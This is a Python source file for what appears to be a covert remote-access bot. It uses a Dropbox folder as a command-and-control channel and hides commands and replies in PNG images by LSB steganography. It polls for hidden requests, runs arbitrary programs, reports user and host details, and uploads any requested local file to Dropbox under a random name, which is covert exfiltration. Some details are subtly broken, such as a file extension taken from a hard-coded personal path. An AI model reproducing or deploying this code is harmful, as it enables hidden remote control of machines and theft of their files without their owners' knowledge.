import dropbox
import sys
from stegano import lsb
from randimage import get_random_image
from datetime import datetime
import matplotlib
import random
import os
import io
import time
import string
import subprocess


CHECK_PERIOD = 60

def current_time():
    return round(time.time() * 1000)

def current_datetime():
    return datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def init(access_token):
    access_token = sys.argv[1]
    dbx = dropbox.Dropbox(access_token)

    if len(dbx.files_list_folder('').entries) == 0:
        dbx.files_create_folder('/art')

    return dbx


def register(dbx):
    img_size = (512,512)
    img = get_random_image(img_size)

    buf = io.BytesIO()

    matplotlib.image.imsave(buf, img)

    message = current_datetime() + "|RESPONSE|register|;"

    secret = lsb.hide(buf, message,  lsb.generators.eratosthenes())

    buf = io.BytesIO()
    secret.save(buf, format='PNG')

    f=open('/usr/share/dict/words')
    lines=f.readlines()

    names = []
    for entry in dbx.files_list_folder('/art').entries:
        names.append(entry.name[:-4])

    print(names)
  
    idx = random.randint(0, len(lines))
    new_name = lines[idx].strip()
    while new_name in names:
        idx = random.randint(0, len(lines))
        new_name = lines[idx].strip()

    new_name = new_name+'.png'

    dbx.files_upload(buf.getvalue(), '/art/' + new_name)

    return new_name


def call_command(args):
    proc = subprocess.run(args, capture_output=True, text=True)
    if proc.returncode == 0:
        ret = proc.stdout
    else:
        ret = proc.stderr
    return ret

def execute_command(dbx, fields):
    #print("Executing " + str(fields))
    words = fields[2].split(' ')
    print(words)

    if words[0] == 'who':
        content = call_command(["w"])
    elif words[0] == 'ls':
        #subprocess.Popen("echo Hello World", shell=True, stdout=subprocess.PIPE).stdout.read()
        content = call_command(["ls", words[1]])
    elif words[0] == 'id':
        content = call_command(["id"])
    elif words[0] == 'cp':
        path = words[1]
        if not os.path.isfile(path):
            content = 'cp error - no such file'
        else:
            ext = os.path.splitext('/home/david/graphs/lm_gen_edges.png')[-1]
            rand_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=32)) + ext
            f = open(path, "rb")
            dbx.files_upload(io.BytesIO(f.read()).getvalue(), '/art/' + rand_name)
            content = rand_name + '\n'
    elif words[0] == 'execute':
        content = call_command([words[1]])
    else: 
        content = 'Invalid command'

    return content

def listen(dbx, my_id):
    print("Listening...")
    last_check = datetime.now()
    while True:
        diff = datetime.now() - last_check
        if diff.seconds <= CHECK_PERIOD:
            time.sleep(CHECK_PERIOD - diff.seconds)

        print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
        tmp = datetime.now()    
        process_commands(dbx, my_id, last_check)
        last_check = tmp

def process_commands(dbx, my_id, last_check):
    for entry in dbx.files_list_folder('/art').entries:
        if entry.name == my_id:
            dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)

    message = lsb.reveal(tmp_path + my_id, lsb.generators.eratosthenes())

    for line in message.split(';')[:-1]:
        fields = line.split('|')
        #print(fields)
        command_time = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")
        if last_check < command_time and fields[1] == 'REQUEST':
            content = 'Response to ' + fields[0] + ' ' + fields[2] + ' from ' + my_id + '\n'
            content += execute_command(dbx, fields)
            response = fields.copy()
            response[0] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            response[1] = 'RESPONSE'
            response[3] = content
            message += '|'.join(response)
            message += ';'

    secret = lsb.hide(tmp_path + my_id, message,  lsb.generators.eratosthenes())

    buf = io.BytesIO()
    secret.save(buf, format='PNG')
    dbx.files_upload(buf.getvalue(), '/art/' + my_id, mode=dropbox.files.WriteMode.overwrite)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Error - Invalid Call")
        print("Usage: python3", sys.argv[0], "APP_ACCESS_TOKEN TMP_DIR_PATH")
    else:
        tmp_path = sys.argv[2]
        if not os.path.exists(tmp_path):
            os.makedirs(tmp_path)

        dbx = init(sys.argv[1])
        my_id = register(dbx)
        listen(dbx, my_id)
        
